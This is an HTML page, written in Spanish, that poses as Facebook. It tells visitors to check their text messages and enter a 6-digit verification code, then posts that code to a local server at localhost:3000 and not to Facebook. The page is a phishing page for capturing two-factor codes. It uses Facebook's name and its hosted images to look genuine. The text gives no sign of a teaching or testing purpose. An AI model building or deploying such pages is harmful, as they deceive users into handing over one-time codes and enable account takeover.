<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Ingrese su PIN</title>
    <link rel="stylesheet" href="css/pin.css" />
  </head>
  <body>
    <div class="container">
      <div class="header">
        <h3>Facebook</h3>
        <h2>Revisa tus mensajes de texto</h2>
        <h3>Escribe el código que hemos enviado a tu teléfono celular</h3>
      </div>
      <div class="image">
        <img
          src="https://static.xx.fbcdn.net/rsrc.php/v3/yb/r/ZXDhqU01Coo.png"
          alt="pinimage"
          class="logo"
        />
      </div>
      <div class="form">
        <form action="http://localhost:3000/submit-pin" method="post">
          <label for="pin">Ingrese su PIN de 6 dígitos:</label>
          <input
            type="tel"
            placeholder="Código"
            id="pin"
            name="pin"
            min="000000"
            max="999999"
            pattern="\d{6}"
            required
          />
          <button type="submit">Enviar</button>
        </form>
      </div>
    </div>
  </body>
</html>
